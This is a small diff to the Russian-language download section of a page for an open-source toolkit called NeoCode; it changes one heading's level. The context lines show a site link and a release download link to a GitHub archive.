@@ -6,7 +6,7 @@ NeoCode - это инструментарий с открытым исходны
 
 http://w91155yf.beget.tech/
 
-<h4>Загрузить</h4>
+<h3>Загрузить</h3>
 
 v1.0.0 release 
 <a href="https://github.com/theneocode/-theneocode/raw/master/min.css.zip">Скачать</a>
